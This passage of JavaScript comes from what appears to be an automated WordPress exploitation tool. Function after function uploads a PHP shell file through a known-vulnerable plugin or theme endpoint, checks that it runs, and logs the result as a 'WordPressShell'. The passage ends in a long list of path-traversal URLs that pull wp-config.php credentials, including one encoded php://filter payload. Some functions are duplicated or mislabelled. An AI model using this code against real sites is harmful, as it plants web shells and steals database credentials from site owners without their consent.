                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_wysija Success'+': '+url+"/wp-content/uploads/wysija/themes/VulnX/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/wysija/themes/VulnX/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_wysija Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload wp_wysija Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_inboundiomarketing(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "theme": fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'overwriteexistingtheme':'on',
                    'action':'themeupload',
                    'submitter':'Upload'
                };
                request.post({url: url+"/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_inboundiomarketing Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_inboundiomarketing Success'+': '+url+"/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_inboundiomarketing Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload wp_inboundiomarketing Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_levoslideshow(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "album_img": fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'task' : 'lvo_add_new_album',
                    'album_name': '',
                    'album_desk': '',
                };
                request.post({url: url+"/wp-admin/admin.php?page=levoslideshow_manage", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload check_wp_levoslideshow Failed',2)
                        resolve(false);
                        return
                    } else {
                        var uploadfolder = string.match("/uploads/levoslideshow/(.*?)/big/VulnXYZ.php/")
                        var Check = await global.requestget(url + "/wp-content/uploads/levoslideshow/"+uploadfolder[0]+"/big/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload check_wp_levoslideshow Success'+': '+url+"/wp-content/uploads/levoslideshow/"+uploadfolder[0]+"/big/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/levoslideshow/"+uploadfolder[0]+"/big/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload check_wp_levoslideshow Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload check_wp_levoslideshow Failed',2)
                resolve(false);
            }
        });
    }

    async  check_cubed(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    file: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/themes/cubed_v1.2/functions/upload-handler.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload cubed Failed',2)
                        resolve(false);
                        return
                    } else {
                        var data = new Date();
                        var month    = data.getMonth();          // 0-23
                        var year     = data.getFullYear(); 
                        var Check = await global.requestget(url + "/wp-content/uploads/"+year+"/"+month+"/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload cubed Success'+': '+url+"/wp-content/uploads/"+year+"/"+month+"/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/"+year+"/"+month+"/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload cubed Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload cubed Failed',2)
                resolve(false);
            }
        });
    }

    async  check_pitchprint(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    files: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/pitchprint/uploader", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload pitchprint Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/pitchprint/uploader/files/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload pitchprint Success'+': '+url+"/wp-content/plugins/pitchprint/uploader/files/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/pitchprint/uploader/files/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload pitchprint Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload pitchprint Failed',2)
                resolve(false);
            }
        });
    }

    async  check_satoshi(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    uploadfile: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/themes/satoshi/upload-file.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload satoshi Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/satoshi/images/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload satoshi Success'+': '+url+"/wp-content/satoshi/images/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/satoshi/images/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload satoshi Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload satoshi Failed',2)
                resolve(false);
            }
        });
    }

    async  check_pinboard(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload pinboard Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/themes/pinboard/uploads/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload pinboard Success'+': '+url+"/wp-content/themes/pinboard/uploads/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/themes/pinboard/uploads/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload barclaycart Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload pinboard Failed',2)
                resolve(false);
            }
        });
    }

    async  check_barclaycart(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload barclaycart Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/barclaycart/uploadify/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload barclaycart Success'+': '+url+"/wp-content/plugins/barclaycart/uploadify/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/barclaycart/uploadify/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload barclaycart Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload barclaycart Failed',2)
                resolve(false);
            }
        });
    }

    async  check_barclaycart(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/wpstorecart/php/upload.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wpstorecart Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/wpstorecart/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wpstorecart Success'+': '+url+"/wp-content/uploads/wpstorecart/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/wpstorecart/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: evolve wpstorecart Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wpstorecart Failed',2)
                resolve(false);
            }
        });
    }

    async  check_Asset_Manager(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/asset-manager/upload.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload Asset_Manager Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/assets/temp/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload Asset_Manager Success'+': '+url+"/wp-content/uploads/assets/temp/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/assets/temp/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: evolve Asset_Manager Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload Asset_Manager Failed',2)
                resolve(false);
            }
        });
    }

    async  check_evolve(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    qqfile: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload evolve Failed',2)
                        resolve(false);
                    } else {
                        var data = new Date();
                        var month    = data.getMonth();          // 0-23
                        var year     = data.getFullYear(); 
                        var Check = await global.requestget(url + "/wp-content/uploads/"+year+"/"+month+"/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload evolve Success'+': '+url+"/wp-content/uploads/"+year+"/"+month+"/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/"+year+"/"+month+"/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: evolve wpmp Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload evolve Failed',2)
                resolve(false);
            }
        });
    }

    async  check_acf_frontend(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    files: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload acf_frontend Failed',2)
                        resolve(false);
                        return
                    } else {
                        var data = new Date();         // 0-23
                        var year     = data.getFullYear(); 
                        var Check = await global.requestget(url + "/wp-content/uploads/uigen_"+year+"/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload acf_frontend Success'+': '+url+"/wp-content/uploads/uigen_"+year+"/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/uigen_"+year+"/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: acf_frontend wpmp Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload acf_frontend Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wpmp(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-admin/admin-post.php?task=wpmp_upload_previews", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wpmp Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/wpmp-previews/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wpmp Success'+': '+url+"/wp-content/uploads/wpmp-previews/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/wpmp-previews/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wpmp Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wpmp Failed',2)
                resolve(false);
            }
        });
    }

    async  check_uploadify(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "folder": "/wp-content/uploads",
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/uploader/uploadify/uploadify.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload uploadify Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload uploadify Success'+': '+url+"/wp-content/uploads/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload uploadify Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload uploadify Failed',2)
                resolve(false);
            }
        });
    }

    async  check_uploadify2(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    Filedata: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload uploadify2 Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/wp-property/third-party/uploadify/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload uploadify2 Success'+': '+url+"/wp-content/plugins/wp-property/third-party/uploadify/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/wp-property/third-party/uploadify/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload uploadify2 Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload uploadify2 Failed',2)
                resolve(false);
            }
        });
    }

    async  check_social_networking(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "config_path": "../../../../../../",
                    image: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload social_networking Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/social-networking-e-commerce-1/images/uploads/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload social_networking Success'+': '+url+"/wp-content/plugins/social-networking-e-commerce-1/images/uploads/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/social-networking-e-commerce-1/images/uploads/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload social_networking Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload social_networking Failed',2)
                resolve(false);
            }
        });
    }

    async  check_nm_filemanager(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "action": "nm_filemanager_upload_file",
                    "name": "upload.php/",
                    file: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-admin/admin-ajax.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload nm_filemanager Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/user_uploads/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload nm_filemanager Success'+': '+url+"/wp-content/uploads/user_uploads/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/user_uploads/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload nm_filemanager Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload nm_filemanager Failed',2)
                resolve(false);
            }
        });
    }

    async  check_magic_fields(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    qqfile: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload magic_fields Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/files_mf/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload magic_fields Success'+': '+url+"/wp-content/files_mf/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/files_mf/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload magic_fields Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload magic_fields Failed',2)
                resolve(false);
            }
        });
    }

    async  check_swfupload(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'UPLOADDIR': '../',
                    'ADMINEMAIL': 'test@example.com',
                    'Filedata': [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/developer-tools/libs/swfupload/upload.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload tst Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/developer-tools/libs/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload tst Success'+': '+url+"/wp-content/plugins/developer-tools/libs/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/developer-tools/libs/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload tst Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload tst Failed',2)
                resolve(false);
            }
        });
    }

    async  check_uploadFavicon(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'upload-favicon': 'fake',
                    'iconImage': [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload uploadFavicon Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/favicon/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload uploadFavicon Success'+': '+url+"/wp-content/uploads/favicon/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/favicon/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload uploadFavicon Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload uploadFavicon Failed',2)
                resolve(false);
            }
        });
    }

    async  check_upload_slide(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'file': [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload upload_slide Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/jssor-slider/jssor-uploads/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload upload_slide Success'+': '+url+"/wp-content/jssor-slider/jssor-uploads/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/jssor-slider/jssor-uploads/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload upload_slide Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload upload_slide Failed',2)
                resolve(false);
            }
        });
    }

    async  check_cherry(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'file': [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/cherry-plugin/admin/import-export/upload.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload cherry Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload cherry Success'+': '+url+"/wp-content/plugins/cherry-plugin/admin/import-export/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload cherry Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload cherry Failed',2)
                resolve(false);
            }
        });
    }

    async  check_ConfigGlobalArray(url) {
        return new Promise(async function(resolve, reject){
            var links = ['/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php', '/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php', '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php', '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php', '/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php', '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php', '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php', '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php', '/wp-content/force-download.php?file=../wp-config.php', '/wp-content/blog/secondaryphase/mdocs-posts/?mdocs-img-preview=../../../../wp-config.php', '/wp-admin/blog/admin-ajax.php?action=revslider_show_image&img=../../wp-config.php', '/mdocs-posts/?mdocs-img-preview=../wp-config.php', '/force-download.php?file=wp-config.php', '/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php', '/wp-content/plugins/plugin-newsletter/preview.php?data=../../../wp-config.php', '/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../wp-config.php', '/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php', '/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10', '/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php', '/wp-content/plugins/bookx/includes/bookx_export.php?file=../../../../wp-config.php', '/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php', '/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php', '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php', '/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php', '/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php', '/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php', '/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php', '/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php', '/wp-content/plugins/harma-booking/frontend/ajax/gateways/proccess.php?gateway=../../../../../../wp-config.php', '/wp-content/plugins/mdocs-posts/?mdocs-img-preview=../../../wp-config.php', '/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php', '/wp-content/plugins/image-export/download.php?file=../../../wp-config.php', '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php', '/wp-content/plugins/sell-downloads/sell-downloads.php?file=./../../../wp-config.php', '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php', '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php', '/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==', '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php', '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php', '/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php', '/wp-content/plugins/mailz/lists/config/config.php?wpabspath=../../../../../wp-config.php', '/wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&blogUrl=asdf&abspath=../../../../wp-config.php', '/wp-content/plugins/accept-signups/accept-signups_submit.php?file=../../../wp-config.php', '/wp-content/plugins/wp-filemanager/incl/libfile.php?path=&filename=../../../../wp-config.php&action=download', '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php', '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php', '/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../wp-config.php&filename=../../../wp-config.php&contenttype=text/html&transient=1', '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php%00', '/wp-content/plugins/rb-agency/ext/forcedownload.php?file=../../../../wp-config.php', '/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../wp-config.php', '/wp-content/plugins/document_manager/views/file_download.php?fname=../../../../wp-config.php', '/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php', '/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php', '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php', '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php%00', '/wp-content/plugins/abtest/abtest_admin.php?action=../../../wp-config.php', '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php', '/wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php', 